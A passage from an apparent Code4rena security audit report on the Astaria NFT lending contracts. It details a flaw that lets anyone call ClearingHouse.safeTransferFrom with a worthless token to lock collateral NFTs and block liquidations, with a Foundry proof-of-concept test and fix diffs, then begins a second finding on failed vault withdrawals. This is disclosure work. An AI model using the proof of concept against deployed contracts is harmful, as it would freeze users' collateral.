clearinghouse. This call to <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L169-L178\">ClearingHouse.safeTransferFrom</a> triggers the further processing of the liquidation. It will pay the debt with the funds received from Seaport, and delete data from LienToken and CollateralToken for this collateral NFT.</p>\n<p>The problem is that the <code>ClearingHouse.safeTransferFrom</code> can be called by anyone and assumes valid call parameters. One of the parameters <code>identifier</code> is used to pass the paymentToken address. This can easily be modified to let the contract accept any ERC20 token as <code>paymentToken</code> to payoff the debt.<br>\nThis allows a malicious actor to lock a user’s collateral NFT and cancel the auction.<br>\nThis could be misused to completely block any liquidatons.</p>\n<p>The steps to reproduce:</p>\n<ol>\n<li>Normal flow: borrow funds via requestLienPosition</li>\n<li>borrowed funds are not paid back before stack.point.end </li>\n<li>liquidator calls AstariaRouter.liquidate(…)</li>\n</ol>\n<p>At this time a Seaport auction is initiated and CollateralToken state for this collateralID is updated to be in auction.\nAll fine so far.</p>\n<ol start=\"4\">\n<li>An evil actor can now call ClearingHouse.safeTransferFrom with dummy data and a dummy ERC20  token address as paymentToken</li>\n</ol>\n<p>After this call, the Collateral NFT will still be in de ClearingHouse contract, but references to the NFT are cleaned up from both CollateralToken and LienToken.\nThis results in the NFT being locked in the contract without any way to get it out.</p>\n<h3 id=\"technical-details\" style=\"position:relative;\"><a href=\"#technical-details\" aria-label=\"technical details permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Technical details</h3>\n<p>When a liquidation is started, <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L425\">_generateValidOrderParameters</a> is called to generate the Seaport order params. It sets <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L456\">settlementToken as the identifierOrCriteria</a>.</p>\n<p>ClearingHouse assumes that <code>safeTransferFrom</code> will only be called by Seaport after a succesful auction, and assumes the identifier is the <code>settlementToken</code> value that was set for the order.<br>\nThe _execute function is called, which <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L123\">converts the identifier parameter to a paymentToken address</a> and checks if the received amount of paymentToken is >= the expected auction currentOfferPrice it accepts the call and moves the token balance to the correct addresses.<br>\nIt then calls <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L497-L510\">LienToken.payDebtViaClearingHouse</a>, passing the fake <code>paymentToken</code> as a parameter.<br>\nLientoken contract also does not verify if the token is ineed the correct settlementToken and pays off the debt with the fake token balance.<br>\nIt then deletes the <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L509\">collateralStateHash</a> for the collateralId, removing the stack state.</p>\n<p>After that,  <code>CollateralToken.settleAuction</code> is called, which <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L538\">burns the token</a> for collateralId and <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L537\">deletes idToUnderlying</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L544\">collateralIdToAuction</a> for this collateralId.</p>\n<p>We now have a state where the collateral NFT is in the ClearingHouse contract, but all actions are made impossible, because the state in the token contracts are removed.\n<code>CollateralToken.ownerOf(collateralID)</code> reverts because the entry in <code>s.idToUnderlying</code> was removed.<br>\nThis causes <code>releaseToAddress()</code> and <code>flashAction()</code> to fail.<br>\n<code>liquidatorNFTClaim</code> fails because <code>s.collateralIdToAuction</code> was cleared.<br>\nTrying to create a new Lien also fails as that calls <code>CollateralToken.ownerOf(collateralID)</code>.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of concept</h3>\n<p>To test the scenario, I have modified the testLiquidationNftTransfer test in AstariaTest.t.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/test/AstariaTest.t.sol b/src/test/AstariaTest.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index c7ce162..bfaeca6 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/test/AstariaTest.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/test/AstariaTest.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -18,6 +18,7 @@ import &quot;forge-std/Test.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import {Authority} from &quot;solmate/auth/Auth.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import {FixedPointMathLib} from &quot;solmate/utils/FixedPointMathLib.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import {MockERC721} from &quot;solmate/test/utils/mocks/MockERC721.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import {MockERC20} from &quot;solmate/test/utils/mocks/MockERC20.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   MultiRolesAuthority</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> } from &quot;solmate/auth/authorities/MultiRolesAuthority.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -1030,8 +1031,19 @@ contract AstariaTest is TestHelpers {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint8(0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     vm.stopPrank();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256 bid = 100 ether;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _bid(Bidder(bidder, bidderPK), listedOrder, bid);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 collateralId = tokenContract.computeId(tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ClearingHouse CH = COLLATERAL_TOKEN.getClearingHouse(collateralId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    // create a worthless token and send it to the clearinghouse</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    MockERC20 worthlessToken = new MockERC20(&quot;TestToken&quot;,&quot;TST&quot;,18);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    worthlessToken.mint(address(CH),550 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    // call safeTransferFrom on clearinghouse with the worthless token as paymentToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    // thiss will trigger the cleaning up after succesful auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 tokenAsInt = uint256(uint160(address(worthlessToken)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bytes memory emptyBytes;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    CH.safeTransferFrom(address(0),address(bidder),tokenAsInt,0,emptyBytes);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // assert the bidder received the NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     assertEq(nft.ownerOf(tokenId), bidder, &quot;Bidder did not receive NFT&quot;);</span></span></span></code></pre>\n<p>After this, the <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/test/AstariaTest.t.sol#L1037\">assert the bidder received the NFT</a> test will fail, as the NFT is not moved.\nBut the state of the CollateralToken and LienToken contracts is updated.</p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual audit, forge</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Minimal fix would be to check either check if the supplied paymentToken matches the expected paymentToken, or ignore the parameter alltogether and use the paymentToken from the contract. Other option is to restrict calls to the function to whitelisted addresses (OpenSea controler and conduit ).</p>\n<p>In the current setup, there is no easy way for the ClearingHouse to access information about the settlementToken.<br>\nIt could be added to the AuctionData struct:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/interfaces/ILienToken.sol b/src/interfaces/ILienToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 964caa2..06433c0 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/interfaces/ILienToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/interfaces/ILienToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -238,6 +238,7 @@ interface ILienToken is IERC721 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint48 startTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint48 endTime;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address liquidator;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address settlementToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     AuctionStack[] stack;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<p>and then add it in LienToken</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/LienToken.sol b/src/LienToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 631ac02..372e197 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/LienToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/LienToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -340,6 +340,8 @@ contract LienToken is ERC721, ILienToken, AuthInitializable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       .liquidationInitialAsk</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       .safeCastTo88();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     auctionData.endAmount = uint88(1000 wei);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    auctionData.settlementToken = stack[0].lien.token; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     s.COLLATERAL_TOKEN.getClearingHouse(collateralId).setAuctionData(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       auctionData</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span></code></pre>\n<p>In the ClearingHouse it can be used directly, ignoring the supplied parameter:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 5c2a400..d305ff5 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/ClearingHouse.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/ClearingHouse.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -120,7 +120,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0)); // get the router from the immutable arg</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ClearingHouseStorage storage s = _getStorage();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address paymentToken = s.auctionStack.settlementToken;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 currentOfferPrice = _locateCurrentAmount({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       startAmount: s.auctionStack.startAmount,</span></span></span></code></pre>\n<p>or used to check the supplied paramameter</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 5c2a400..5a79184 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/ClearingHouse.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/ClearingHouse.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -121,6 +121,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ClearingHouseStorage storage s = _getStorage();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    require(paymentToken == s.auctionStack.settlementToken);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 currentOfferPrice = _locateCurrentAmount({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       startAmount: s.auctionStack.startAmount,</span></span></span></code></pre>\n<p>With this step added, it would still be possible to lock the NFT in the contract, but this time that will only succeed when the requested auction amount is paid. So in that case it would be more logical to simply bid on OpenSea and also get the NFT instead of paying the tokens just to lock it.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/564#event-8369713354\">SantiagoGregory (Astaria) confirmed via duplicate issue <code>#564</code></a></strong></p>\n<hr>\n<h2 id=\"h-04-strategist-can-fail-to-withdraw-asset-token-from-a-private-vault\" style=\"position:relative;\"><a href=\"#h-04-strategist-can-fail-to-withdraw-asset-token-from-a-private-vault\" aria-label=\"h 04 strategist can fail to withdraw asset token from a private vault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/489\">[H-04] Strategist can fail to withdraw asset token from a private vault</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/489\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/502\">m9800</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/474\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/403\">evan</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/356\">jesusrod15</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/326\">Apocalypto</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/82\">ladboy233</a></em></p>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52\">https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73</a></p>\n<p>Calling the <code>AstariaRouter.withdraw</code> function calls the following <code>ERC4626RouterBase.withdraw</code> function; however, calling <code>ERC4626RouterBase.withdraw</code> function for a private vault reverts because the <code>Vault</code> contract does not have an <code>approve</code> function. Directly calling the <code>Vault.withdraw</code> function for a private vault can also revert since the <code>Vault</code> contract does not have a way to set the allowance for itself to transfer the asset token, which can cause many ERC20 tokens’ <code>transferFrom</code> function calls to revert when deducting the transfer amount from the allowance. Hence, after depositing some of the asset token in a private vault, the strategist can fail to withdraw this asset token from this private vault and lose this deposit.</p>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52\">https://github.com/AstariaXYZ/astaria-gpl/blob/main/src/ERC4626RouterBase.sol#L41-L52</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxSharesOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sharesOut</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ((</span><span class=\"mtk12\">sharesOut</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)) &gt; </span><span class=\"mtk12\">maxSharesOut</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MaxSharesError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L70-L73</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 